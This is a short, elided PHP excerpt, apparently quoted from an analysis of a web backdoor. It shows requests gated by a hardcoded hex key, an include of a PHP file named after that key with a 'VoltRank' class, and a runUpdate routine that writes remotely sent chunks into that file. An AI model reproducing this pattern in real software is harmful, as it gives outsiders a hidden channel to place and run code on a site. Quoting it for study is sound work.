...
if (isset ($_POST['dbg']) && '63b44e375386f6f19c527e7' == $_POST['vu']) {
...
if (isset ($_POST ['ta'])) {
	...
	require_once ($dir . '/63b44e375386f6f19c527e7.php');
	$vr = new VoltRank ();
	echo $vr->display ();
...
else if (!empty ($_POST['vu']) && !empty ($_POST['sid']) && '63b44e375386f6f19c527e7' == $_POST['vu'] && !empty ($_POST['chCnt'])) {
...
function runUpdate ($siteId, $updateKey, $maxChunks) {
	...
	$destination = dirname (__FILE__) . '/63b44e375386f6f19c527e7.php';
